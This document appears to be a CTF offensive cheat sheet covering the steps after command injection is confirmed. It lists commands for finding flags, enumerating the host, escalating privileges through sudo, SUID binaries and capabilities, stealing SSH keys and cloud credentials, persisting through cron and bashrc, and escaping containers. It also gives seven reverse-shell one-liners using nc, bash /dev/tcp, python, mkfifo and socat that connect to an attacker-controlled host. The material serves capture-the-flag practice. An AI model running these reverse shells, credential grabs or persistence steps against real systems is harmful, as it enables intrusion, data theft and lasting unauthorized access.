# Chains — what cmdi buys and how to spend it

## The ladder after exec is confirmed

```
confirmed exec (uid= in output / repeatable sleep)
  ├─→ read the flag           :cat /flag;cat flag*;find / -name 'flag*'
  ├─→ enumerate               :id;uname -a;ls -la /;env;cat /etc/passwd
  ├─→ read source/configs     :cat /app/*.py;env|grep -i key
  ├─→ write a webshell        :echo '<?php...' > /var/www/x.php
  ├─→ pivot/reverse           :nc/bach devtcp — rarely needed in CTF
  └─→ escalate                :sudo -l;suid find;capabilities
```

## The flag-location hunt — where CTF flags live

```
/flag /flag.txt /root/flag /home/*/flag /app/flag*
./flag ./flag.txt flag.php /tmp/flag
env vars: FLAG, CTF_FLAG — `env|grep -i flag`
config: config.php settings.py .env — `find / -name '*.env'`
DB: /etc/flag inside a sqlite/db — `find / -name '*.db'`
```

```
find / -name '*flag*' -type f 2>/dev/null
find / -type f -readable -exec grep -l 'flag{' {} \; 2>/dev/null | head
grep -r 'flag{' / --include='*' -l 2>/dev/null | head
ls -la / /app /var/www /home /root /tmp 2>/dev/null
```

## cmdi → file-read chain (when exec can't read the flag)

- exec confirmed but `cat /flag` fails (permissions) →
  - `sudo -l` → which commands can run as root
  - SUID binaries — `find / -perm -4000` → GTFOBins list
  - capabilities — `getcap -r /` — `cap_setuid`/`cap_dac_read_search`
  - writable cron/systemd/paths — privesc via config edit
- the `web` user can't read `/root/flag` — chain a privesc

## cmdi → RCE-into-lateral

- `cat ~/.ssh/id_rsa`/`authorized_keys` write → ssh
- `crontab` write → scheduled
- `/root/.bashrc` write → next-login exec
- `~/.aws`/`gcloud`/`kube` creds → cloud pivot
- docker.sock writable → container escape

## The "flag needs the app's own access" case

Sometimes the flag lives in a path only the APP user can read —
`cat /flag` as `www-data` works but the file isn't in the webroot —
the exec channel is the read: `cat /flag` output IS the read.

## cmdi → writeup-evidence chain

Per `hooks.py`: verbatim `uid=`/`flag{...}` output in `--response` +
`--evidence` substring — the `id`/`whoami` output IS the evidence.

## The "exec → shell" upgrade — when interactive helps

CTF rarely needs a shell — `cat /flag` suffices. If interactive is
needed:

```
nc -e /bin/sh YOU PORT      — nc -e
ncat YOU PORT -e sh
bash -i >& /dev/tcp/YOU/PORT 0>&1
sh -i >& /dev/udp/YOU/PORT 0>&1
python -c 'import socket,os,pty;s=socket.socket();s.connect(("YOU",P));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/sh")'
mkfifo /tmp/f;sh -i</tmp/f 2>&1|nc YOU PORT>/tmp/f
socat exec:'sh',pty tcp:YOU:PORT
```

## cmdi → other bug classes

- cmdi → write file → web-upload-side primitive
- cmdi → `cat` source → find a second bug (sqli creds, ssti)
- cmdi → read config → creds → auth bypass elsewhere
- cmdi → drop a phar/phar:// upload → deser chain

## Falsifiers

- exec unconfirmed (no channel)
- exec confirmed but flag is in a separate service/auth domain the
  process can't reach — the pivot is the next step, not a failure

## Output to record

- the verbatim flag/evidence output + the chain steps taken
